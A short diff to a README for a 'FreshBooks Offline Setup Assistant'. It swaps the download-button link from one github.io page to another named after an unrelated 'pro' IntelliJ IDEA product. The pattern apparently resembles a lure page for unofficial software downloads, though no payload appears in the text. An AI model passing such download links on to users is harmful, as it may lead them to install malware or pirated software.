@@ -1,6 +1,6 @@
 # FreshBooks — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://freshbooks-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://jetbrains-intellij-idea-pro.github.io/.github)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
